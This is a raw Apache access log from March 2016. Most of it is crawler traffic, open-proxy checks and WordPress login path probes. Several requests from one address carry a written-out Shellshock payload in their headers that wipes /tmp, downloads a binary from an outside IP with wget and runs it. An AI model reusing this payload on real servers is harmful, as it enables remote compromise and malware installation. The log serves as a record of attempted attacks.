123.126.68.116 - - [02/Mar/2016:03:16:02 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
220.181.108.141 - - [02/Mar/2016:03:16:51 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:03:17:56 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:03:28:46 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
121.42.0.33 - - [02/Mar/2016:03:28:51 +0800] "GET / HTTP/1.0" 403 4961 "-" "spiderman"
148.251.136.43 - - [02/Mar/2016:03:39:30 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:03:50:01 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:04:00:10 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
193.201.224.40 - - [02/Mar/2016:04:07:49 +0800] "GET / HTTP/1.1" 403 4961 "-" "Go 1.1 package http"
148.251.136.43 - - [02/Mar/2016:04:10:16 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
220.181.108.157 - - [02/Mar/2016:04:16:50 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:04:20:29 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
185.49.14.190 - - [02/Mar/2016:04:23:43 +0800] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 299 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
123.126.68.116 - - [02/Mar/2016:04:29:30 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34"
123.126.68.116 - - [02/Mar/2016:04:29:30 +0800] "GET /icons/apache_pb.gif HTTP/1.1" 200 2326 "http://zixuephp.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34"
123.126.68.116 - - [02/Mar/2016:04:29:30 +0800] "GET /icons/poweredby.png HTTP/1.1" 200 3956 "http://zixuephp.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34"
148.251.136.43 - - [02/Mar/2016:04:31:20 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
69.61.12.70 - - [02/Mar/2016:04:36:21 +0800] "GET / HTTP/1.1" 403 4961 "http://BGZRYISE4WW2C2CEENTY46J7BTURPU53XRXGQEW2F6ROGF7TXLO7ELZAZNC3BJH.YKGFYUZDU.2DI4YK3C7WEB5KTVEAPO35D2QFG5Z6TAT6QMXKYZQLQMD3OY.cdn1.common.crawl.zone/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
69.61.12.70 - - [02/Mar/2016:04:36:22 +0800] "GET / HTTP/1.1" 403 4961 "http://BGZRYISE4WW2C2CEENTY46J7BTURPU53XRXGQEW2F6ROGF7TXLO7ELZAZNC3BJH.YKGFYUZDU.2DI4YK3C7WEB5KTVEAPO35D2QFG5Z6TAT6QMXKYZQLQMD3OY.cdn1.common.crawl.zone/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36"
188.165.237.64 - - [02/Mar/2016:04:36:42 +0800] "GET /index.php/admin/ HTTP/1.1" 404 292 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/23.0.1271.17 Safari/537.11"
188.165.237.64 - - [02/Mar/2016:04:36:47 +0800] "GET /downloader HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/23.0.1271.6 Safari/537.11"
148.251.136.43 - - [02/Mar/2016:04:42:00 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:04:52:14 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
157.55.39.53 - - [02/Mar/2016:05:00:51 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.53 - - [02/Mar/2016:05:00:54 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
148.251.136.43 - - [02/Mar/2016:05:02:33 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.74 - - [02/Mar/2016:05:12:15 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:05:13:08 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
220.181.108.117 - - [02/Mar/2016:05:15:27 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:05:23:18 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:05:33:25 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:05:44:21 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:05:55:18 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
114.215.193.240 - - [02/Mar/2016:06:01:00 +0800] "CONNECT search.yahoo.com:443 HTTP/1.1" 405 308 "-" "-"
148.251.136.43 - - [02/Mar/2016:06:05:32 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.78 - - [02/Mar/2016:06:13:16 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:06:15:53 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
220.181.108.82 - - [02/Mar/2016:06:16:03 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:06:26:01 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:06:36:05 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:06:46:14 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
91.121.93.7 - - [02/Mar/2016:06:52:52 +0800] "GET /wp-admin/ HTTP/1.1" 404 285 "-" "-"
148.251.136.43 - - [02/Mar/2016:06:56:26 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
5.178.86.78 - - [02/Mar/2016:07:04:43 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=145687348301&a=PSCN&i=1926721863&p=80 HTTP/1.1" 404 294 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
83.243.58.157 - - [02/Mar/2016:07:05:27 +0800] "GET /wordpress/wp-admin/ HTTP/1.1" 404 295 "-" "-"
148.251.136.43 - - [02/Mar/2016:07:06:35 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
198.71.225.140 - - [02/Mar/2016:07:11:35 +0800] "GET /blog/wp-admin/ HTTP/1.1" 404 290 "-" "-"
123.125.71.107 - - [02/Mar/2016:07:13:11 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.111 - - [02/Mar/2016:07:16:16 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:07:17:35 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
205.186.184.33 - - [02/Mar/2016:07:17:43 +0800] "GET /wp/wp-admin/ HTTP/1.1" 404 288 "-" "-"
213.246.45.128 - - [02/Mar/2016:07:27:23 +0800] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 300 "-" "Mozilla"
148.251.136.43 - - [02/Mar/2016:07:28:29 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:07:39:31 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:07:49:49 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
23.251.63.45 - - [02/Mar/2016:08:00:12 +0800] "GET http://azenv.net/ HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
23.251.63.45 - - [02/Mar/2016:08:00:13 +0800] "CONNECT www.alipay.com:443 HTTP/1.1" 405 306 "-" "-"
23.251.63.45 - - [02/Mar/2016:08:00:33 +0800] "GET http://www.mesregies.com/azz.php HTTP/1.1" 404 288 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; Trident/5.0)"
23.251.63.45 - - [02/Mar/2016:08:00:36 +0800] "CONNECT www.baidu.com:443 HTTP/1.1" 405 305 "-" "-"
148.251.136.43 - - [02/Mar/2016:08:01:09 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:08:11:17 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.126.68.143 - - [02/Mar/2016:08:12:23 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
123.126.68.143 - - [02/Mar/2016:08:12:24 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34"
123.126.68.143 - - [02/Mar/2016:08:12:25 +0800] "GET /icons/apache_pb.gif HTTP/1.1" 200 2326 "http://zixuephp.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34"
123.126.68.143 - - [02/Mar/2016:08:12:25 +0800] "GET /icons/poweredby.png HTTP/1.1" 200 3956 "http://zixuephp.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34"
123.125.71.83 - - [02/Mar/2016:08:13:42 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.117 - - [02/Mar/2016:08:16:35 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:08:22:17 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:08:32:40 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
91.121.83.118 - - [02/Mar/2016:08:35:39 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
95.32.87.187 - - [02/Mar/2016:08:39:14 +0800] "GET /configuration.old HTTP/1.0" 404 293 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Hotbar 4.4.5.0; .NET CLR 1.1.4322)"
148.251.136.43 - - [02/Mar/2016:08:42:52 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
103.246.38.196 - - [02/Mar/2016:08:49:37 +0800] "GET /plus/ad_js.php?aid=9 HTTP/1.1" 404 290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
148.251.136.43 - - [02/Mar/2016:08:53:04 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
69.61.12.70 - - [02/Mar/2016:09:00:57 +0800] "GET / HTTP/1.1" 403 4961 "" "Mozilla/5.0 CommonCrawler Node 4FU6RZJTWV3LQPXFIEE7ZCJI5KCGYL26DCVERF6Y5D3TWUWD4JXE3WUN5OQO4PE.PSGPX3Q3Y.NRJCVSRRVK7DOFFNBYYKVYQNAFQN3LABRBAI63RYVZCUGDJD.cdn0.common.crawl.zone"
148.251.136.43 - - [02/Mar/2016:09:04:11 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
52.90.171.43 - - [02/Mar/2016:09:10:16 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.01  [et]"
52.90.171.43 - - [02/Mar/2016:09:10:17 +0800] "GET /icons/apache_pb.gif HTTP/1.1" 200 2326 "http://zixuephp.com/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.01  [et]"
52.90.171.43 - - [02/Mar/2016:09:10:17 +0800] "GET /icons/poweredby.png HTTP/1.1" 200 3956 "http://zixuephp.com/" "Mozilla/4.0 (compatible; MSIE 5.0; Windows XP) Opera 6.01  [et]"
123.125.71.79 - - [02/Mar/2016:09:14:01 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:09:14:29 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
220.181.108.76 - - [02/Mar/2016:09:16:38 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:09:24:54 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:09:35:08 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
208.80.194.27 - - [02/Mar/2016:09:43:06 +0800] "GET / HTTP/1.0" 403 4961 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US) Gecko/20101012 Firefox/3.6.11"
148.251.136.43 - - [02/Mar/2016:09:46:05 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:09:56:35 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:10:07:03 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.107 - - [02/Mar/2016:10:13:32 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.82 - - [02/Mar/2016:10:16:44 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:10:17:23 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
114.246.56.33 - - [02/Mar/2016:10:23:27 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"
114.246.56.33 - - [02/Mar/2016:10:23:30 +0800] "GET /bbs HTTP/1.1" 404 279 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"
148.251.136.43 - - [02/Mar/2016:10:27:56 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:10:39:05 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:10:49:25 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:11:00:13 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:11:10:16 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.107 - - [02/Mar/2016:11:13:14 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.101 - - [02/Mar/2016:11:16:41 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:11:20:35 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:11:31:15 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
148.251.136.43 - - [02/Mar/2016:11:41:33 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
103.56.63.200 - - [02/Mar/2016:11:49:37 +0800] "GET / HTTP/1.1" 403 4961 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-xcal\xe8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-xcal\xe8 >> /tmp/Run.sh;echo /tmp/China.Z-xcal\xe8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-xcal\xe8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-xcal\xe8 >> /tmp/Run.sh;echo /tmp/China.Z-xcal\xe8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
103.56.63.200 - - [02/Mar/2016:11:51:02 +0800] "GET / HTTP/1.1" 403 4961 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-lzfh >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-lzfh >> /tmp/Run.sh;echo /tmp/China.Z-lzfh >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-lzfh >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-lzfh >> /tmp/Run.sh;echo /tmp/China.Z-lzfh >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
148.251.136.43 - - [02/Mar/2016:11:51:42 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
103.56.63.200 - - [02/Mar/2016:11:58:06 +0800] "GET / HTTP/1.1" 403 4961 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-gjxp\xa8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-gjxp\xa8 >> /tmp/Run.sh;echo /tmp/China.Z-gjxp\xa8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-gjxp\xa8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-gjxp\xa8 >> /tmp/Run.sh;echo /tmp/China.Z-gjxp\xa8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
103.56.63.200 - - [02/Mar/2016:11:58:11 +0800] "GET / HTTP/1.1" 403 4961 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-iiue\xa8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-iiue\xa8 >> /tmp/Run.sh;echo /tmp/China.Z-iiue\xa8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-iiue\xa8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-iiue\xa8 >> /tmp/Run.sh;echo /tmp/China.Z-iiue\xa8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
95.213.187.189 - - [02/Mar/2016:11:59:23 +0800] "CONNECT check.best-proxies.ru:80 HTTP/1.1" 400 313 "-" "-"
148.251.136.43 - - [02/Mar/2016:12:02:02 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
103.56.63.200 - - [02/Mar/2016:12:10:08 +0800] "GET / HTTP/1.1" 403 4961 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-coao\xa8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-coao\xa8 >> /tmp/Run.sh;echo /tmp/China.Z-coao\xa8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://115.28.206.48:8080/u25 -O /tmp/China.Z-coao\xa8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-coao\xa8 >> /tmp/Run.sh;echo /tmp/China.Z-coao\xa8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
148.251.136.43 - - [02/Mar/2016:12:12:35 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
123.125.71.111 - - [02/Mar/2016:12:13:13 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
220.181.108.102 - - [02/Mar/2016:12:16:08 +0800] "GET / HTTP/1.1" 403 4961 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
148.251.136.43 - - [02/Mar/2016:12:23:08 +0800] "GET /robots.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
94.102.50.49 - - [02/Mar/2016:12:27:16 +0800] "GET //wp-login.php HTTP/1.1" 404 290 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
94.102.50.49 - - [02/Mar/2016:12:27:16 +0800] "GET /blog//wp-login.php HTTP/1.1" 404 296 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
94.102.50.49 - - [02/Mar/2016:12:27:17 +0800] "GET /wordpress//wp-login.php HTTP/1.1" 404 301 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
94.102.50.49 - - [02/Mar/2016:12:27:18 +0800] "GET /wp//wp-login.php HTTP/1.1" 404 294 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
